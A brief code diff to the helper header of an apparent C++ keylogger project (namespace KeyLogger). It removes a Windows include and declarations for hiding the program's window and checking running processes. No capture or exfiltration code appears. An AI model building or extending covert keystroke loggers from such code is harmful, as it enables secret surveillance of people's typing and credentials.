@@ -1,7 +1,6 @@
 /*
 	#This is the helper header where all necessary utility and functions are declared and defined
 */
-#include <Windows.h>
 #include <ctime>
 #include <string>
 #include <sstream>
@@ -88,7 +87,3 @@ namespace KeyLogger
 		filelog.close();
 	}
 }
-
-//General functions
-void HideWindow(); // Just defined function. But already not running the exe as a console app. So no window will be formed  by default.
-bool IsProcessRunning(LPSTR procname);
